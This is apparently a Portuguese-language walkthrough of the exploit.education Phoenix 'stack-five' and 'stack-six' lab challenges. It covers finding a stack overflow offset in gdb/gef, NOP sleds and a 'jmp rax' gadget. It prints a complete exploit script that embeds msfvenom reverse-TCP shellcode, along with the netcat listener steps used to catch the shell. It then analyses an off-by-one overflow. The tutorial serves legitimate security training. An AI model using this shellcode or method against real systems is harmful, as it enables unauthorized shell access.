<h2><a class="header" href="#agora-vamos-executar-o-programa-analise-dinamica" id="agora-vamos-executar-o-programa-analise-dinamica">Agora vamos executar o programa (analise dinamica)</a></h2>
<p>126 As não causam erro, e 127 As causam... ue, mas pq? não era pra dar erro só em 128?</p>
<pre><code class="language-bash">$ python3 -c &quot;print('A'*126)&quot; | ./stack-five 
Welcome to phoenix/stack-five, brought to you by https://exploit.education

$ python3 -c &quot;print('A'*127)&quot; | ./stack-five 
Welcome to phoenix/stack-five, brought to you by https://exploit.education
Segmentation fault
</code></pre>
<p>Isso vai ser muito importante no próximo desafio: buffers são terminados com um null byte!</p>
<p>Por enquanto, isso só nos mostra que o compilador não adicionou nada no meio do caminho entre o buffer e o EBP+EIP Salvos :D</p>
<p>E nós ja sabemos como controlar o EIP, então agora só precisamos saber para onde redirecionar a execução :)</p>
<h2><a class="header" href="#encontrar-endereço-do-buffer" id="encontrar-endereço-do-buffer">Encontrar endereço do buffer</a></h2>
<p>Agora dentro do gdb (<strong>gdb stack-five</strong>)</p>
<blockquote>
<p>gef&gt; r &lt;&lt;&lt; $(python3 -c &quot;print('A'*100)&quot;)</p>
<p>r é o comand do gdb para rodar o programa!
Adicionando &quot;&lt;&lt;&lt;&quot; nós podemos mandar uma string pro input! Tambem funciona com arquivos ( r &lt; nome_do_arquivo ) :D</p>
</blockquote>
<pre><code class="language-x86asm">gef&gt; r &lt;&lt;&lt; $(python3 -c &quot;print('A'*100)&quot;)
Starting program: /opt/phoenix/amd64/stack-five &lt;&lt;&lt; $(python3 -c &quot;print('A'*100)&quot;)
Welcome to phoenix/stack-five, brought to you by https://exploit.education

Breakpoint 1, 0x000000000040059c in start_level ()

--- Output do gef ---
</code></pre>
<blockquote>
<p>gef é uma extensão do gdb que vai te dar um monte de informação util quando você chegar num breakpoint</p>
</blockquote>
<p>O output do gef contem:
<img src="stack/phoenix/./img/gef_example.png" alt="" />
Porem, mais informações podem ser adicionadas! use <code>gef help</code> para ver como ele pode te ajudar :D </p>
<p>Caso o programa seja executado sem breakpoints e com muitos As, vamos receber uma SIGSEV informando que &quot;$PC&quot;(outro nome para RIP) não pode ser redirecionado para &quot;41414141&quot;, confirmando que o nosso buffer overflow é possivel (olha as linhas no final da segunda imagem)
<img src="stack/phoenix/./img/stack_five/gef_A_overflow_0.png" alt="" />
<img src="stack/phoenix/./img/stack_five/gef_A_overflow_1.png" alt="" /></p>
<p>Agora, vamos colocar o breakpoint em <code>call gets()</code> e executar o programa com 140 As
<img src="stack/phoenix/./img/stack_five/before_gets_0.png" alt="" /></p>
<p>As partes importante no output do gef são:</p>
<p>registers
<img src="stack/phoenix/./img/stack_five/before_gets_3.png" alt="" /></p>
<p>argumentos (vazio: o pointer em RDI aponta para <strong>0x00007fffffffe5b0</strong>, que possui o valor 0x0000...,)
<img src="stack/phoenix/./img/stack_five/before_gets_1.png" alt="" /></p>
<blockquote>
<p>Lembrete de que pointer começa com 2 NULL bytes ai :D 0x<strong>0000</strong>7fff....</p>
</blockquote>
<p>stack
<img src="stack/phoenix/./img/stack_five/before_gets_2.png" alt="" /></p>
<p>Você tambem acha que tem uma falta de AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA ?? hehehe :P</p>
<p>(((Insira aquele meme muito velho da cabra gritando)))</p>
<p>Então vamos avançar para próxima instrução (step: <code>s</code>) :D
<img src="stack/phoenix/./img/stack_five/gef_after_gets_0.png" alt="" /></p>
<p>Isso quer dizer que aquele pointer dos argumentos (RDI) agora aponta para os As! :D</p>
<pre><code class="language-x86asm">gef&gt; x/s 0x00007fffffffe5b0              -&gt; x/s é o comando para printar strings
0x7fffffffe5b0:	'A' &lt;repete 140 vezes&gt;
</code></pre>
<p>Então nos ja temos o endereço dos nossos As :D ... que em breve serão shellcode :D</p>
<p>Mas agora precisamos saber com presição quantos As até o RIP, <code>info frame</code> vai nos ajudar com isso:</p>
<pre><code class="language-x86asm">gef&gt; info frame
Stack level 0, frame at 0x7fffffffe640:
 rip = 0x4005a1 in start_level  saved rip = 0x4005c7
 called by frame at 0x7fffffffe610
 Arglist at 0x7fffffffe630, args: 
 Locals at 0x7fffffffe630, Previous frame's sp is 0x7fffffffe640
 Saved registers:
  rbp at 0x7fffffffe630, rip at 0x7fffffffe638
</code></pre>
<p>A ultima linha é a mais importante!</p>
<p>RIP em: <code>0x7fffffffe638</code></p>
<p>Então para encontrar precisamente quantos As precisamos colocar até chegarmos no RIP,
basta subtrair <code>endereço do rip salvo - endereço dos As</code></p>
<pre><code class="language-x86asm">$ python3
&gt;&gt;&gt; 0x7fffffffe638 - 0x00007fffffffe5b0
136
</code></pre>
<p>Para confirmar isso, vamos rodar com 136 As + BBBB</p>
<p><img src="stack/phoenix/./img/stack_five/gef_136A_BBBB.png" alt="" /></p>
<p>RIP = BBBB (42424242) :D</p>
<h2><a class="header" href="#nop-sled" id="nop-sled">NOP sled</a></h2>
<p>Entretando, como nada pode ser simples nesse mundo do desenvolvimento de exploits, nós não conseguimos saber com precisão que o buffer vai estar naquela localização :(</p>
<p>Isso ocorre pois as envs são alocadas na stack. E elas variam muito, por exemplo, só de mudar o local de onde o programa esta sendo executado quebraria o nosso exploit.</p>
<blockquote>
<p>Dica: O gef pode nos ajudar a encontra-las
<img src="stack/phoenix/./img/stack_five/gef_envs_1.png" alt="" /></p>
</blockquote>
<p>Por exemplo:</p>
<p><img src="stack/phoenix/./img/stack_five/gef_envs_0.png" alt="" /></p>
<p>Para remediar isso, podemos usar um NOP sled (ou NOP slide) ! :D</p>
<p>(Outro metodo de remediação é mencionado em <code>stack-six</code>)</p>
<p>NOP significa &quot;<strong>No</strong> <strong>OP</strong>eration&quot; (<strong>N</strong>enhuma <strong>OP</strong>eração) ! é uma instrução que não faz nada :D</p>
<p>A representação em machine code do NOP é <code>0x90</code> :D Bem fácil de decorar, quem me dera escola fosse fácil assim hehehe :)</p>
<p>O processador vai fazer nada e passar para a próxima, e se nós colocarmos varios desses em sequencia, o RIP vai &quot;deslizando&quot; através até chegar no nosso código!</p>
<p>Você pode imaginar um escorregador :D yuuuuupiii</p>
<p><img src="stack/phoenix/./img/panda_slide_1.gif" alt="" /></p>
<p>Então a gente redireciona o RIP para o meio do escorregador de NOPs, para ele delizar até o nosso código :D</p>
<p>Assim, mesmo se o buffer estiverem em um endereço diferente, o RIP vai chegar no nosso shellcode</p>
<p>Para testar isso, vamos usar o truque do <code>0xCC</code> mencionado anteriormente</p>
<p>O input que vai passar vai conter:</p>
<pre><code class="language-x86asm">NOP * 135
0xCC
Enderço para ser colocado no RIP: 0x00007fffffffe5b0 + 70

70 = metade do escorregador (135)
</code></pre>
<p>E os <strong>breakpoints do gdb serão removidos</strong>, então caso encontremos um breakpoint, foi o <code>0xCC</code> acima</p>
<pre><code class="language-x86asm">$ python3
&gt;&gt;&gt; hex(0x00007fffffffe5b0 + 70)
'0x7fffffffe5f6'                     - Little Endian -&gt; '\xb6\xe5\xff\xff\xff\x7f'
</code></pre>
<p>Agora executando:</p>
<pre><code class="language-x86asm">r &lt;&lt;&lt; $(python -c &quot;print '\x90' *135 + '\xcc' +'\xb6\xe5\xff\xff\xff\x7f'&quot;)
</code></pre>
<p>Nos recebemos uma SIGTRAP (chegou no breakpoint)</p>
<pre><code class="language-x86asm">[#0] Id 1, Name: &quot;stack-five&quot;, stopped, reason: SIGTRAP
</code></pre>
<p>E na seção <code>code</code> do gef
<img src="stack/phoenix/./img/stack_five/gef_run_xCC.png" alt="" />
Meio dificil de ver, mas tem:</p>
<pre><code class="language-x86asm">NOP
NOP
INT3
(bad)
(bad)
</code></pre>
<blockquote>
<p>int3 é o nome de 0xCC, da mesma maneira que NOP é o nome de 0x90 </p>
</blockquote>
<p>Apos a nossa ultima intrução ha intruções invalidas <code>(bad)</code> que eram o nosso pointer, e logo em seguida o resto do programa normal! :D</p>
<h2><a class="header" href="#shellcode" id="shellcode">Shellcode</a></h2>
<p>Shellcode é o codigo malicioso que vai ser executado ( normalmente te dando uma shell (terminal) não autorizada )</p>
<p>Nos podemos usar os do link citado na dica, ou gerar uma usando <code>msfvenom</code> (ja vem instalado no kali linux)</p>
<blockquote>
<p>msfvenom -p linux/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 --platform linux -a x64 -f python --var-name buf</p>
</blockquote>
<pre><code>No encoder specified, outputting raw payload
Payload size: 74 bytes
Final size of python file: 373 bytes
buf =  b&quot;&quot;
buf += b&quot;\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48&quot;
buf += b&quot;\x97\x48\xb9\x02\x00\x11\x5c\x7f\x00\x00\x01\x51\x48&quot;
buf += b&quot;\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e&quot;
buf += b&quot;\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58&quot;
buf += b&quot;\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48&quot;
buf += b&quot;\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05&quot;

</code></pre>
<p>Agora, vamos fazer um exploit mais bem feito! <code>vim /tmp/gerar_exploit.py</code></p>
<pre><code class="language-python">buf =  b&quot;&quot;

# shellcode
buf += b&quot;\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48&quot;
buf += b&quot;\x97\x48\xb9\x02\x00\x11\x5c\x7f\x00\x00\x01\x51\x48&quot;
buf += b&quot;\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e&quot;
buf += b&quot;\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58&quot;
buf += b&quot;\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48&quot;
buf += b&quot;\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05&quot;

# NOP Sled para completar o resto do tamanho
buf = '\x90'*(136-len(buf)) + buf

# ret
buf += b'\xb6\xe5\xff\xff\xff\x7f' 


open(&quot;/tmp/exploit&quot;,&quot;wb&quot;).write(buf)
</code></pre>
<blockquote>
<p>O script /tmp/gerar_exploit.py vai gerar o que colocariamos no input, mas ao enves de printarmos para o terminal, vamos salvar em um arquivo binario (por isso o &quot;<code>wb</code>&quot; no <code>open</code>)! </p>
<p>Depois é só ler esse arquivo e redireciona-lo <code>cat /tmp/exploit | ./stack-five</code> </p>
</blockquote>
<p>Porem, se tentamos executar esse exploit, recebemos <code>SIGSEV: violação de segmento</code></p>
<h2><a class="header" href="#corrigindo-o-problema" id="corrigindo-o-problema">Corrigindo o problema</a></h2>
<p>Nessa eu empaquei, e a solução veio daqui: <a href="https://blog.lamarranet.com/index.php/exploit-education-phoenix-stack-five-solution/">blog lamarranet</a></p>
<p>Então valeu pela ajuda :D</p>
<p>Ao enves de colocar o endereço do buffer diretamente no RIP, vamos achar algo no programa original que aponte para ele: um <code>jmp esp</code> por exemplo</p>
<p>E o beneficio é que, por estarmos pulando para uma parte estatica, e usando-a para redirecionar para o buffer, não corremos o risco do buffer mudar de endereço!</p>
<p>Isso quer dizer que não precisamos mais do NOP slide :D </p>
<h3><a class="header" href="#rop-gadgets" id="rop-gadgets">ROP Gadgets</a></h3>
<p>Essa é uma tecnica chamada programação <code>ROP</code>, que sera discutida em tutoriais futuros :D  Mas o que você precisa saber por enquanto é que cada um desses <code>jmps</code> é chamado de <strong>gadget</strong></p>
<p>Gadgets são instruções em outras partes do programa, que são reaproveitadas por nos. Geralmente executar algo e pular para outro gadget!</p>
<p>Para achar esse jmp que nos ajudaria, podemos usar uma ferramenta chamda <code>ROPgadget</code></p>
<pre><code class="language-x86asm">$ ROPgadget --binary stack-five --only &quot;jmp&quot;
Gadgets information
============================================================
0x0000000000400481 : jmp rax

Unique gadgets found: 1
</code></pre>
<p>Isso quer dizer que, ao pular para <code>0x400481</code>, vamos executar <code>jmp rax</code> e acabar pulando para rax! e para onde rax aponta?</p>
<p>Colocando um break antes do ret de <code>start_level</code>, podemos ver que antes de retornar, rax aponta para o mesmo endereço que rsp, e convenientemente o incio do nosso buffer
<img src="stack/phoenix/./img/stack_five/gef_rax.png" alt="" /></p>
<p>rax,rdi e rsp apontam para o inicio do buffer dos As</p>
<p>Assim, não vamos mais precisar do NOP slide: temos um exploit que 100% dos casos vai apontar para o inicio do buffer!</p>
<p>Só precisamos colocar <code>padding</code> entre o shellcode e o RIP</p>
<p>Então vamos modificar o exploit :D</p>
<pre><code>Dica: Shellcode+AAAAA+ret, Little Endian, 136 bytes ate RIP

Se você não quiser ver a solução enquanto tenta!
.
.
.
.
.
.
.
.
.
.
.
</code></pre>
<pre><code class="language-python">buf =  &quot;&quot;

# shellcode
buf += &quot;\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48&quot;
buf += &quot;\x97\x48\xb9\x02\x00\x11\x5c\x7f\x00\x00\x01\x51\x48&quot;
buf += &quot;\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e&quot;
buf += &quot;\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58&quot;
buf += &quot;\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48&quot;
buf += &quot;\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05&quot;

# Padding
buf += 'A' * (136 - len(buf))

# ret
buf += '\x81\x04\x40' # Aponta para jmp rax

open(&quot;/tmp/exploit&quot;,&quot;wb&quot;).write(buf)
</code></pre>
<blockquote>
<p>Eu removi o <strong>b&quot;&quot;</strong> pq tava dando problema :(</p>
</blockquote>
<p>Agora basta gerar o exploit: <code>python /tmp/gerar_exploit.py</code></p>
<p>Abrir um novo terminal: <code>ssh -p 2222 user@localhost</code></p>
<p>Terminal 1: <code>nc -lvnp 4444</code></p>
<p>Terminal 2: <code>cat /tmp/exploit | ./stack-five</code> </p>
<p>Agora, no terminal 1 deve ter uma shell :D</p>
<p><img src="stack/phoenix/./img/stack_five/Exploit_working.png" alt="" /></p>
<blockquote>
<p>Dica: <code>bash -ip</code> vai deixar a sua shell mais usavel</p>
</blockquote>
<p>Se nos tivessemos executado o programa como root, a nossa shell teria esses privilegios elevados ! :D</p>
<p><img src="stack/phoenix/./img/stack_five/root_exploit.png" alt="" /></p>
<p><code>UID = 0</code> quer dizer que possuimos privilegios de root, mesmo que o <code>whoami</code> não tenha dito root</p>
<p>E se o programa estivesse exposto para a rede, poderiamos conseguir uma root shell remota :D (spoiler para os proximos desafios hehehe)</p>
<hr />
<p>Você chegou até aqui :D</p>
<p>Toma mais um gif de panda como presente</p>
<p><img src="stack/phoenix/./img/panda_slide_0.gif" alt="" /></p>
<h1><a class="header" href="#-solução-5" id="-solução-5">💫 Solução</a></h1>
<blockquote>
<p>vim /tmp/gerar_exploit.py</p>
</blockquote>
<pre><code>buf =  &quot;&quot;

# shellcode
buf += &quot;\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48&quot;
buf += &quot;\x97\x48\xb9\x02\x00\x11\x5c\x7f\x00\x00\x01\x51\x48&quot;
buf += &quot;\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e&quot;
buf += &quot;\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58&quot;
buf += &quot;\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48&quot;
buf += &quot;\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05&quot;

# Filler
buf += 'A' * (136 - len(buf))

# ret
buf += '\x81\x04\x40' # Aponta para jmp rax

open(&quot;/tmp/exploit&quot;,&quot;wb&quot;).write(buf)
</code></pre>
<p>Agora basta gerar o exploit: <code>python /tmp/gerar_exploit.py</code></p>
<p>Abrir um novo terminal: <code>ssh -p 2222 user@localhost</code></p>
<p>Terminal 1: <code>nc -lvnp 4444</code></p>
<p>Terminal 2: <code>cat /tmp/exploit | ./stack-five</code> </p>
<p>Agora, no terminal 1 deve ter uma shell :D</p>
<h1><a class="header" href="#-dicas-2" id="-dicas-2">💡 Dicas</a></h1>
<p>Off-by-one BOF</p>
<h1><a class="header" href="#-explicação-4" id="-explicação-4">🛸 Explicação</a></h1>
<p>O programa aceita um nome por meio da env <code>ExploitEducation</code>! Esse nome é usado para gerar uma mensagem de boas vindas! \ 
Esse processo de gerar as mensagens é vulneravel a buffer overflow!</p>
<h2><a class="header" href="#analisando-o-programa-1" id="analisando-o-programa-1">Analisando o programa</a></h2>
<h3><a class="header" href="#main" id="main">main</a></h3>
<pre><code class="language-C">int main(int argc, char **argv) {
  char *ptr;
  printf(&quot;%s\n&quot;, BANNER);

#ifdef NEWARCH
  if (argv[1]) {
    what = argv[1];
  }
#endif

  ptr = getenv(&quot;ExploitEducation&quot;);
  if (NULL == ptr) {
    // This style of comparison prevents issues where you may accidentally
    // type if(ptr = NULL) {}..

    errx(1, &quot;Please specify an environment variable called ExploitEducation&quot;);
  }

  printf(&quot;%s\n&quot;, greet(ptr));
  return 0;
}
</code></pre>
<p>Main começa definindo um pointer (<code>ptr</code>) e printando o banner</p>
<p>Em seguida, faz verificaçõs relacionadas à arquitetura do sistema usando o diretivo:
<code>#ifdef NEWARCH</code>. O diretivo <code>#ifdef NOME</code> checa se a macro chamda <code>NOME</code> existe.</p>
<p>Isso é usado para tornar o incio da mensagem de boas vindas (gerada por <code>greet</code>) ser dependente da arquitetura!</p>
<p>Por isso nos não a encontramos no codigo fonte! Mas caso usemos <code>strings</code> conseguimos encontra-las no binario:
<img src="stack/phoenix/./img/stack_six/Messages_ARCH.png" alt="Diferença entre as arquiteturas" /></p>
<p>Em seguida, main salva o valor da env var &quot;ExploitEducation&quot; no pointer ptr</p>
<p>Depois, é checado se ptr é NULL (a env var não existe)</p>
<p>Caso não exista: usa a função errx() para enterromper a execução com uma mensagem de erro! errx() recebe 2 argumento: (codigo_do_erro, mensagem_do_erro)</p>
<p>No nosso caso:</p>
<pre><code class="language-C">  ptr = getenv(&quot;ExploitEducation&quot;);
  if (NULL == ptr) {
    errx(1, &quot;Please specify an environment variable called ExploitEducation&quot;);
  }
    // Codigo de erro: 1
   // Mensagem de erro: Por favor, especifique uma env var chamada ExploitEducation
</code></pre>
<p>Nos podemos confirmar isso usando: <code>echo $?</code>, que printa o codigo retornado pelo ultimo programa
<img src="stack/phoenix/./img/stack_six/Exit_Codes_errx.png" alt="0 = sem erro, 1 = erro" /></p>
<blockquote>
<p>0 = sem erro, 1 = erro</p>
</blockquote>
<p>por ultimo, <code>greet()</code> é chamada, e o valor retornado por ela é printado!</p>
<p>E o programa finaliza retornando <code>0</code> (sem erro)!</p>
<h4><a class="header" href="#dica" id="dica">Dica</a></h4>
<p>Para definir uma env var no gdb</p>
<p><img src="stack/phoenix/./img/stack_six/Exit_Codes_gdb.png" alt="set environment ExploitEducation=ABC" /></p>
<blockquote>
<p>set environment ExploitEducation=ABC</p>
</blockquote>
<h3><a class="header" href="#greet" id="greet">greet</a></h3>
<pre><code class="language-C">char *greet(char *who) { // who = nome da pessoa
  char buffer[128];
  int maxSize;

  maxSize = strlen(who);
  if (maxSize &gt; (sizeof(buffer) - /* garantir terminação com null */ 1)) {
    maxSize = sizeof(buffer) - 1;
  }

  strcpy(buffer, what);			// Inicio da mensagem de boas vindas
  strncpy(buffer + strlen(buffer), who, maxSize);

  return strdup(buffer);
}
</code></pre>
<p>Agora chega a parte vulneravel! D:</p>
<p>A função <code>greet</code> recebe um argumento: &quot;who&quot; (quem recebe a mensagem de boas vindas)</p>
<p>São definidas duas variaveis locais: <code>buffer[128]</code> e <code>maxSize</code> (tamanho maximo)</p>
<p>O tamanho de <code>who</code> é salvo em <code>maxSize</code></p>
<blockquote>
<p>Lembrete: Buffers são terminados com um NULL byte, portanto um buffer[128] só armazena 127 letras!</p>
</blockquote>
<p>Em seguida, é checado se <code>maxSize</code> é maior que o <code>tamanho(buffer) - 1</code> (-1 por causa no null byte final)</p>
<p>Caso seja maior, <code>maxSize</code> vai ser denifido como o <code>tamanho(buffer) - 1</code> (maxSize = 127)</p>
<blockquote>
<p>Portando, o limite de maxSize é 127</p>
</blockquote>
<p>Essa é uma tentativa de prevenir o buffer overflow! Pois, só seriam copiados 127 bytes, impedindo o overflow D:</p>
<p>Mas aqui que entra o problema: essa contagem não leva em consideração o inicio da mensagem (<code>what</code>)! Aquele que era dependente da arquitetura :D</p>
<p>Então nos vamos acabar escrevendo fora do buffer! Aqui esta a parte do codigo que causa a vulnerabilidade</p>
<pre><code class="language-C">strcpy(buffer, what); // what = incio da mensagem
strncpy(buffer, who, maxSize); // who = o valor de ExploitEducation! Quem recebe o oi :D
</code></pre>
<p>Nos ja sabemos como o <code>strcpy</code> funciona (você passa um buffer como alvo e o que vamos salvar nele, ignorando tamanho! 
Caso nos conseguissemos controlar what, poderiamos facilmente exploitar o programa)</p>
<p>str <strong>N</strong> cpy (<code>strncpy</code>) é similar a <code>strcpy</code>, mas recebe um terceiro parametro: tamanho!</p>
<p>Esse tamanho é limitado à 127 (limite de <code>maxSize</code>), então teoricamente não seria exploitavel :(</p>
<p><strong>Mas espera ai, ja tinha coisa naquele buffer!!! O inicio da mensagem!!!</strong></p>
<p>O tamanho do inicio é 34 bytes (na versão amd64)</p>
<pre><code class="language-python">$ python3
&gt;&gt;&gt; x = &quot;Welcome, I am pleased to meet you &quot;
&gt;&gt;&gt; len(x)
34
</code></pre>
<p>Isso quer dizer que no buffer cabem 128, mas foram colocados <strong>34 + 127</strong>: Overflow!</p>
<p>Então se não fosse pelo inicio da mensagem, não seria exploitavel :D</p>
<p>Uma maneira de concertar essa vulnerabilidade seria: <code>strncpy(buffer, who, maxSize - sizeof(buffer))</code> (subtrair o tamanho atual)</p>
<h2><a class="header" href="#analisando-o-programa-asm" id="analisando-o-programa-asm">Analisando o programa (ASM)</a></h2>
<h3><a class="header" href="#main-1" id="main-1">main</a></h3>
<pre><code class="language-x86asm">gef&gt; disassemble main
push   rbp
mov    rbp,rsp                    ; Prologo
sub    rsp,0x20


mov    DWORD PTR [rbp-0x14],edi
mov    QWORD PTR [rbp-0x20],rsi
mov    edi,0x400878
call   0x400530 &lt;puts@plt&gt;        ; printar o banner


mov    edi,0x4008c2               ; o 1º argumento é &quot;ExploitEducation&quot;
call   0x400520 &lt;getenv@plt&gt;      ; Le as env vars e coloca &quot;ExploitEducation&quot; em rax


mov    QWORD PTR [rbp-0x8],rax    ; Pointer para rax
cmp    QWORD PTR [rbp-0x8],0x0    ; Compara esse pointer com 0x0 
                                  ; (Teoricamente &quot;cmp rax, 0x0&quot; tambem deveria funcionar,
                                  ; mas salvando nesse pointer, podemos usar o valor depois)

jne    0x4007dd &lt;main+66&gt;         ; Jump not equal (pular se a comparação anterior for diferente)
                                  ; Mas pular para onde? Para main+66 (logo depois da mensagem de erro)
                                  ; Ou melhor: Caso ExploitEducation esteja definida, nos não emitimos erro

Essa parte só executa caso ExploitEducation não exista {
        mov    esi,0x4008d8               ; 2º argumento
        mov    edi,0x1                    ; 1º argumento
        mov    eax,0x0                    ; Valor retornado por main
        call   0x400540 &lt;errx@plt&gt;        ; Enterrompe a execução e sai com erro
}



        0x4007dd &lt;main+66&gt;:
mov    rax,QWORD PTR [rbp-0x8]      ; Lembra daquele pointer que salvamos com o rax de getenv() ? 
                                    ; Coloca ele em rax de novo :D

mov    rdi,rax                      ; 1º argumento: rax (o valor da env ExploitEducation)
call   0x4006fd &lt;greet&gt;             ; Chama greet()
   
mov    rdi,rax                      ; 1º argumento: O valor que greet retornou (salvo em rax)
call   0x400530 &lt;puts@plt&gt;          ; Printa a mensagem de boas vindas para o terminal
   
   
mov    eax,0x0                      ; Valor retornado por main: 0 (sem erro)
leave                               ; Epilogo
ret    
</code></pre>
<p>Não é tão relevante analisar o assembly de greet para entender a vulnerabilidade, dado que temos o codigo fonte!</p>
<p>Mas caso queira, você pode analisar por conta própria e relacionar o ASM com o codigo fonte por treino :D</p>
<h2><a class="header" href="#fuzz" id="fuzz">Fuzz</a></h2>
<p>Agora que sabemos que é possivel realizar o overflow, vamos ver o que é corrompido :D</p>
<p>Nos só podemos colocar 127 no bytes no input, pois se colocarmos mais o programa simplesmente vai remove-los: então <strong>colocar 127 ou 200 teria o mesmo efeito!</strong> :)</p>
<p>Primeiro, vamos encontrar aonde colocaremos nossos breakpoints</p>
<pre><code class="language-x86asm">gef&gt; disassemble greet 
Dump of assembler code for function greet:
   0x00000000004006fd &lt;+0&gt;:	push   rbp
   0x00000000004006fe &lt;+1&gt;:	mov    rbp,rsp		&lt;---
   0x0000000000400701 &lt;+4&gt;:	push   rbx
   0x0000000000400702 &lt;+5&gt;:	sub    rsp,0xa8
.......
.......
   0x0000000000400798 &lt;+155&gt;:	pop    rbx
   0x0000000000400799 &lt;+156&gt;:	pop    rbp		&lt;---
   0x000000000040079a &lt;+157&gt;:	ret    
End of assembler dump
</code></pre>
<p>Vamos colocar uma no incio de greet e uma no final! :D</p>
<pre><code class="language-x86asm">gef&gt; b *0x4006fe 
Breakpoint 1 at 0x4006fe

gef&gt; b *0x40079a
Breakpoint 2 at 0x40079a
</code></pre>
<h2><a class="header" href="#e-vamos-rodar-com-127-as" id="e-vamos-rodar-com-127-as">E vamos rodar com 127 As:</a></h2>
<p>Obs: </p>
<blockquote>
<p>gef&gt; set environment ExploitEducation=$(python -c &quot;print 'A' * 127&quot;)</p>
</blockquote>
<p>Deve ria funcionar, mas não funciona sei la por que :(</p>
<p>Então eu rodei em outro terminal!</p>
<blockquote>
<p>python -c &quot;print 'A' * 127&quot;</p>
</blockquote>
<p>E dei Ctrl+shift+C Ctrl+shift+V</p>
<blockquote>
<p>gef&gt; set environment ExploitEducation=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</p>
</blockquote>
<p>eita, overflow no tutorial XD ! O computador ta se revoltando!! </p>
<p>Agora, vamos rodar o programa <code>r</code>. Quando ele chegar no <code>breakpoint 1</code> (inicio de greet), pode <code>analisar o frame</code> e ver <code>aonde o rbp de main foi salvo</code>!</p>
<pre><code class="language-x86asm">gef&gt; info frame
Stack level 0, frame at 0x7fffffffe590:
 rip = 0x4006fe in greet; saved rip = 0x4007e9
 called by frame at 0x7fffffffe5c0
 Arglist at 0x7fffffffe580, args: 
 Locals at 0x7fffffffe580, Previous frame's sp is 0x7fffffffe590
 Saved registers:
  rbp at 0x7fffffffe580, rip at 0x7fffffffe588                            &lt;- aqui
</code></pre>
<p>Agora que nos sabemos o endereço de RIP e RBP, podemos checar seu valores:</p>
<pre><code class="language-x86asm">endereço: valor

gef&gt; x/xg 0x7fffffffe580            -&gt; rbp
0x7fffffffe580:	0x00007fffffffe5b0
gef&gt; x/xg 0x7fffffffe588            -&gt; rip
0x7fffffffe588:	0x00000000004007e9
</code></pre>
<blockquote>
<p>Obs: o /xg é só para a formatação ficar legivel! Significa e<strong>X</strong>tra <strong>G</strong>rande (que é o tamanho do pointer na arquitetura amd64)!</p>
</blockquote>
<p>Isso quer dizer que no inicio de greet, os valores do RIP e RBP salvos na stack são: <code>0x00000000004007e9</code> e <code>0x00007fffffffe5b0</code></p>
<p>Agora vamos continuar a execução <code>c</code>, e ver se eles se alteram (lembrando greet é vulneravel)!</p>
<pre><code class="language-x86asm">gef&gt; c
---- output do gef ----
gef&gt; x/xg 0x7fffffffe580             -&gt; rbp
0x7fffffffe580:	0x00007fffffffe541
gef&gt; x/xg 0x7fffffffe588             -&gt; rip
0x7fffffffe588:	0x00000000004007e9
</code></pre>
<p>Eita! RBP foi alterado D:</p>
<blockquote>
<p>0x00007fffffffe5<strong>b0</strong> ---&gt;  0x00007fffffffe5<strong>41</strong></p>
</blockquote>
<p>Isso quer dizer que nós conseguimos controlar o ultimos byte do rbp salvo! Esse ultimo byte constuma ser 
chamado de <code>LSB</code> (Least Significant Byte, Byte menos significante)</p>
<p>Assim, quer dizer que esse buffer overflow é um <code>BoF</code> que corrompe o <code>LSB</code>, ou como é mais conhecido: <strong>off-by-one</strong> (errado por um)!</p>
<p>Esse tipo de buffer overflow é bem comum: vão esquecer de que o buffer termina com um <code>0x00</code> e vão comparar o <code>input</code> com o <code>tamanho do buffer</code>,
ao enves do <code>tamanho do buffer - 1</code>. Assim, permitindo que seja escrito 1 byte fora do buffer!</p>
<h4><a class="header" href="#curiosidade" id="curiosidade">Curiosidade</a></h4>
<p>Lembra que o texto no inicio do buffer varia de arquitetura para aquitetura? Isso acontece pois cada uma aloca as variaveis em uma posição,
otimizam de maneira diferente, etcetc!</p>
<p>Muitas vezes um <strong>off-by-one</strong> não vai ser exploitavel, pois o byte que vem logo depois do buffer não nescessariamente é o rbp! 
E esse é o nosso caso: existem outras variaveis dentro de greet!</p>
<p>Assim, quem desenvolveu o desafio nos fez o favor de colocar essa mensagem no inicio para compensar esse espaço!</p>
<p>Caso a mensagem fosse 1 byte maior, poderiamos controlar 2 bytes do rbp! Caso a mensagem fosse 1 byte MENOR, não conseguiriamos controlar o rbp! </p>
<p>E caso a mensagem fosse 4 bytes a mais, como você pode imaginar, poderiamos controlar o RIP :D</p>
<p>...</p>
<p>E caso o programa nem cheque o input? Ai facilita bastante pra gente hehe :D ! É o caso do desafio passado!</p>
<p>Assim, esse desafio foi feito de uma maneira que vá nos ensinar como exploitar um <strong>off-by-one</strong> que nos da <strong>execução de codigo</strong></p>
